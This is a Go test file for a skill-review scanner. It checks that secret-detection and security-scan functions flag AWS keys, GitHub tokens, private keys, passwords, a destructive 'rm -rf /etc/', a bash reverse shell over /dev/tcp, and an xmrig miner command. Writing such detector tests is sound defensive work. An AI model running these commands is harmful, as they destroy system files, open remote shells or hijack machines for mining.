package review

import (
	"testing"
)

func TestRegexScan_DetectsAWSKeys(t *testing.T) {
	content := `Here is my config:
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
some other line`

	issues := RegexScan(content)
	if len(issues) == 0 {
		t.Fatal("Expected to detect AWS key, got no issues")
	}
	if issues[0].Type != "privacy" {
		t.Errorf("Expected type 'privacy', got '%s'", issues[0].Type)
	}
	if issues[0].Line != 2 {
		t.Errorf("Expected line 2, got %d", issues[0].Line)
	}
}

func TestRegexScan_DetectsGitHubTokens(t *testing.T) {
	content := `token = "ghp_ABCDEFghijklmnopqrstuvwxyz0123456789"`
	issues := RegexScan(content)
	if len(issues) == 0 {
		t.Fatal("Expected to detect GitHub token")
	}
}

func TestRegexScan_DetectsPrivateKeys(t *testing.T) {
	content := `-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA...
-----END RSA PRIVATE KEY-----`
	issues := RegexScan(content)
	if len(issues) == 0 {
		t.Fatal("Expected to detect private key")
	}
}

func TestRegexScan_DetectsGenericSecrets(t *testing.T) {
	content := `password = "super_secret_password_123"`
	issues := RegexScan(content)
	if len(issues) == 0 {
		t.Fatal("Expected to detect generic secret")
	}
}

func TestRegexScan_SkipsEnvVarDefinitions(t *testing.T) {
	content := `env_var: "OPENAI_API_KEY"
obtain_url: "https://platform.openai.com"`
	issues := RegexScan(content)
	if len(issues) != 0 {
		t.Errorf("Expected no issues for env_var definitions, got %d", len(issues))
	}
}

func TestRegexScan_CleanContent(t *testing.T) {
	content := `---
name: code-review
version: 1.0.0
---

# Code Review Skill

Review code for bugs and security issues.`

	issues := RegexScan(content)
	if len(issues) != 0 {
		t.Errorf("Expected no issues for clean content, got %d: %v", len(issues), issues)
	}
}

func TestSecurityScan_DetectsRmRf(t *testing.T) {
	content := `Run: rm -rf /etc/`
	issues := SecurityScan(content)
	if len(issues) == 0 {
		t.Fatal("Expected to detect destructive rm")
	}
	if issues[0].Type != "security" {
		t.Errorf("Expected type 'security', got '%s'", issues[0].Type)
	}
}

func TestSecurityScan_DetectsReverseShell(t *testing.T) {
	content := `bash -i >& /dev/tcp/10.0.0.1/4242 0>&1`
	issues := SecurityScan(content)
	if len(issues) == 0 {
		t.Fatal("Expected to detect reverse shell")
	}
}

func TestSecurityScan_DetectsCryptoMiner(t *testing.T) {
	content := `./xmrig --pool stratum+tcp://pool.example.com`
	issues := SecurityScan(content)
	if len(issues) == 0 {
		t.Fatal("Expected to detect crypto miner")
	}
}

func TestSecurityScan_CleanContent(t *testing.T) {
	content := `Run: docker build -t myapp .
Then: docker run -p 8080:8080 myapp`
	issues := SecurityScan(content)
	if len(issues) != 0 {
		t.Errorf("Expected no security issues for clean content, got %d", len(issues))
	}
}
